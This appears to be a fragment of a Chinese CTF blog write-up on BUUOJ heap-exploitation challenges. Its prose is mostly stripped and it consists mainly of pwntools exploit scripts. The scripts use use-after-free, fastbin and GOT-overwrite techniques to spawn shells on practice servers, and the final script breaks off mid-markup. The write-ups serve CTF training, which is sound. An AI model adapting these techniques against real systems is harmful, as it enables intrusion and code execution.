class=\"line\">edit(<span class=\"number\">4</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">'\\x00'</span>*(<span class=\"number\">0x13</span><span class=\"number\">-8</span>) + p64(one_gadget)+p64(realloc))</span><br><span class=\"line\"></span><br><span class=\"line\">sla(<span class=\"string\">'choice: '</span>,<span class=\"string\">'1'</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">sla(<span class=\"string\">'size?'</span>,<span class=\"string\">'32'</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"BJDCTF-2nd-ydsneedgirlfriend2\"><a href=\"#BJDCTF-2nd-ydsneedgirlfriend2\" class=\"headerlink\" title=\"[BJDCTF 2nd]ydsneedgirlfriend2\"></a>[BJDCTF 2nd]ydsneedgirlfriend2</h2><p>UAF</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import binascii</span></span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">\"./pwn3.9\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = remote(\"node3.buuoj.cn\",25561)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,name)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    sl(str(size))</span><br><span class=\"line\">    ru(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    sl(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    sl(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    sl(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x0400D86</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">\"AAAA\"</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b'A'</span>*<span class=\"number\">0x8</span>+p64(magic))</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"babyfengshui-33c3-2016\"><a href=\"#babyfengshui-33c3-2016\" class=\"headerlink\" title=\"babyfengshui_33c3_2016\"></a>babyfengshui_33c3_2016</h2><p></p>\n<ol>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210304194459201.png\" alt=\"image-20210304194459201\"></p>\n<blockquote>\n<p></p>\n</blockquote>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210304194521206.png\" alt=\"image-20210304194521206\"></p>\n<blockquote>\n<p></p>\n</blockquote>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210304194556700.png\" alt=\"image-20210304194556700\"></p>\n<blockquote>\n<p></p>\n</blockquote>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210304194612347.png\" alt=\"image-20210304194612347\"></p>\n<blockquote>\n<p></p>\n</blockquote>\n<p></p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210304202014812.png\" alt=\"image-20210304202014812\"></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li><p></p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210305092048534.png\" alt=\"image-20210305092048534\"></p>\n</li>\n</ol>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210305094604106.png\" alt=\"image-20210305094604106\"></p>\n<p></p>\n<h3 id=\"-2\"><a href=\"#-2\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li>0x80sizegot</li>\n<li>unsorted binsize0x800x80</li>\n</ol>\n<h3 id=\"-2\"><a href=\"#-2\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li></li>\n<li>got</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import binascii</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.13\",)</span></span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">26600</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.13\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Add</span><span class=\"params\">(size, length, text)</span>:</span></span><br><span class=\"line\">\tsla(<span class=\"string\">\"Action: \"</span>, <span class=\"string\">'0'</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">\"description: \"</span>, str(size))</span><br><span class=\"line\">\tsla(<span class=\"string\">\"name: \"</span>, <span class=\"string\">'pz1o'</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">\"length: \"</span>, str(length))</span><br><span class=\"line\">\tsla(<span class=\"string\">\"text: \"</span>, text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Del</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tsla(<span class=\"string\">\"Action: \"</span>, <span class=\"string\">'1'</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">\"index: \"</span>, str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Dis</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tsla(<span class=\"string\">\"Action: \"</span>, <span class=\"string\">'2'</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">\"index: \"</span>, str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Upd</span><span class=\"params\">(index, length, text)</span>:</span></span><br><span class=\"line\">\tsla(<span class=\"string\">\"Action: \"</span>, <span class=\"string\">'3'</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">\"index: \"</span>, str(index))</span><br><span class=\"line\">\tsla(<span class=\"string\">\"length: \"</span>, str(length))</span><br><span class=\"line\">\tsla(<span class=\"string\">\"text: \"</span>, text)</span><br><span class=\"line\">Add(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"string\">'AAAA'</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">Add(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"string\">'BBBB'</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">Add(<span class=\"number\">0x8</span>,<span class=\"number\">0x8</span>,<span class=\"string\">\"/bin/sh\\x00\"</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">Del(<span class=\"number\">0</span>)</span><br><span class=\"line\">free_got = elf.got[<span class=\"string\">\"free\"</span>]</span><br><span class=\"line\">Add(<span class=\"number\">0x100</span>, <span class=\"number\">0x19c</span>, <span class=\"string\">\"A\"</span>*<span class=\"number\">0x198</span>+p32(elf.got[<span class=\"string\">'free'</span>]))</span><br><span class=\"line\">Dis(<span class=\"number\">1</span>)</span><br><span class=\"line\">ru(<span class=\"string\">\"description: \"</span>)</span><br><span class=\"line\">free = uu32(r(<span class=\"number\">4</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">'free'</span>,free)</span><br><span class=\"line\">libc_base = free - libc.dump(<span class=\"string\">'free'</span>)</span><br><span class=\"line\">leak(<span class=\"string\">\"libc\"</span>,libc_base)</span><br><span class=\"line\">sys = libc_base + libc.dump(<span class=\"string\">'system'</span>)</span><br><span class=\"line\">sh = libc_base + libc.dump(<span class=\"string\">'str_bin_sh'</span>) </span><br><span class=\"line\"><span class=\"comment\"># libc_base = free - libc.sym[\"free\"]</span></span><br><span class=\"line\"><span class=\"comment\"># leak(\"libc\",libc_base)</span></span><br><span class=\"line\"><span class=\"comment\"># sys = libc_base + libc.sym[\"system\"]</span></span><br><span class=\"line\"><span class=\"comment\"># sh = libc_base + next(libc.search(\"/bin/sh\"))</span></span><br><span class=\"line\">Upd(<span class=\"number\">1</span>,<span class=\"number\">0x4</span>,p32(sys))</span><br><span class=\"line\">leak(<span class=\"string\">\"sys\"</span>,sys)</span><br><span class=\"line\">Del(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ZJCTF-2019-EasyHeap\"><a href=\"#ZJCTF-2019-EasyHeap\" class=\"headerlink\" title=\"[ZJCTF 2019]EasyHeap\"></a>[ZJCTF 2019]EasyHeap</h2><p></p>\n<ol>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210305193458599.png\" alt=\"image-20210305193458599\"></p>\n<blockquote>\n<p>add</p>\n</blockquote>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210305193516175.png\" alt=\"image-20210305193516175\"></p>\n<blockquote>\n<p>del</p>\n</blockquote>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210305193536046.png\" alt=\"image-20210305193536046\"></p>\n<blockquote>\n<p>edit</p>\n</blockquote>\n<h3 id=\"-2\"><a href=\"#-2\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li>editsize</li>\n</ol>\n<h3 id=\"-3\"><a href=\"#-3\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li>systemlibcunsorted bin attackmagicbuu</li>\n<li>heaparrarygotgot</li>\n<li>3got/bin/shfdfdchunkheaparray</li>\n<li>chunkheaparrayheaparray[0]free.got</li>\n<li>1sysytem</li>\n<li>2</li>\n</ol>\n<h3 id=\"-3\"><a href=\"#-3\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li>free.got</li>\n<li>free.got</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import binascii</span></span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.14\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">25957</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.14\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">create</span><span class=\"params\">(size,content)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"Your choice :\"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">1</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Size of Heap : \"</span>)</span><br><span class=\"line\">\tsl(str(size))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Content of heap:\"</span>)</span><br><span class=\"line\">\tsl(content)</span><br><span class=\"line\">\tru(<span class=\"string\">\"SuccessFul\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"Your choice :\"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">3</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tsl(str(index))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Done !\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index,size,content)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"Your choice :\"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">2</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tsl(str(index))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Size of Heap : \"</span>)</span><br><span class=\"line\">\tsl(str(size))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Content of heap : \"</span>)</span><br><span class=\"line\">\tsl(content)</span><br><span class=\"line\">\tru(<span class=\"string\">\"Done !\"</span>)</span><br><span class=\"line\">free_got = elf.got[<span class=\"string\">\"free\"</span>]</span><br><span class=\"line\">create(<span class=\"number\">0x68</span>,<span class=\"string\">\"A\"</span>*<span class=\"number\">0x68</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">create(<span class=\"number\">0x68</span>,<span class=\"string\">\"B\"</span>*<span class=\"number\">0x68</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">create(<span class=\"number\">0x68</span>,<span class=\"string\">\"C\"</span>*<span class=\"number\">0x68</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">'/bin/sh\\x00'</span> + <span class=\"string\">'a'</span> * <span class=\"number\">0x60</span> + p64(<span class=\"number\">0x71</span>) + p64(<span class=\"number\">0x6020b0</span><span class=\"number\">-3</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,len(payload),payload)</span><br><span class=\"line\">create(<span class=\"number\">0x68</span>,<span class=\"string\">'AAAA'</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">create(<span class=\"number\">0x68</span>,<span class=\"string\">'DDDD'</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">'A'</span>*<span class=\"number\">3</span> + p64(<span class=\"number\">0</span>)*<span class=\"number\">4</span> + p64(free_got)</span><br><span class=\"line\">edit(<span class=\"number\">3</span>,len(payload),payload)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = p64(elf.plt[<span class=\"string\">'system'</span>])</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,len(payload),payload)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"hitcontraining-uaf\"><a href=\"#hitcontraining-uaf\" class=\"headerlink\" title=\"hitcontraining_uaf\"></a>hitcontraining_uaf</h2><p>uaf</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import binascii</span></span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span 